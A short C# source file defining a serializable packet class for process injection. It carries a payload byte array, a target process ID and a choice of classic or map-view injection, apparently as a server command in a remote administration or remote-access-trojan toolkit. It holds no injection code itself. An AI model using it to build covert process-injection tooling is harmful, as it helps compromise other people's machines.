using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ProcessInjectionPacket : IPacket
    {
        public enum INJECTION_METHODS : byte
        {
            CLASSIC = 0,
            MAP_VIEW = 1
        }

        //server
        public ProcessInjectionPacket(byte[] payload, INJECTION_METHODS injectionMethod, int processId) : base()
        {
            this.PacketType = PacketType.PM_INJECT_PROCESS;

            this.payload = payload;
            this.injectionMethod = injectionMethod;
            this.processId = processId;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public INJECTION_METHODS injectionMethod { get; set; }
        public byte[] payload { get; set; }
        public int processId { get; set; }
    }
}
